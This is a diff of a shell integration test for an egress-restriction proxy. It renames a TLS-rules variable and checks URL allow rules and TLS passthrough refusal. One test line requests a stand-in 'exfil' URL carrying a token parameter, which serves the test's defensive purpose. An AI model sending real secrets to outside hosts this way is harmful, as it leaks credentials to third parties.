@@ -4,7 +4,7 @@
 # test/inspect-restrict-scenarios.sh, but driven by whatever allowed_url_rules
 # the audit half's own report generated, not a fixed list.
 #
-# ALLOW_TLS_RULES is cleared for this phase on purpose (see
+# ALLOWED_TLS_RULES is cleared for this phase on purpose (see
 # integration-test-inspect-roundtrip.sh): the URL rules learned from the audit
 # run have to stand alone, so the TLS passthrough the audit run made must now
 # be refused.
@@ -60,7 +60,7 @@ echo "=== [same as audit: query string dropped from the rule] ==="
 OUT=$($S "https://blocked.example.com/exfil?token=SECRET-VALUE")
 check_ok "GET blocked.example.com/exfil?token=..." "$OUT" "ROOT GET"
 
-echo "=== [new: TLS passthrough, since ALLOW_TLS_RULES was cleared for phase 2] ==="
+echo "=== [new: TLS passthrough, since ALLOWED_TLS_RULES was cleared for phase 2] ==="
 CODE=$($C --insecure https://tlspass.example.com/public/x)
 check_status "GET tlspass.example.com (passthrough)" "$CODE" "403"
 
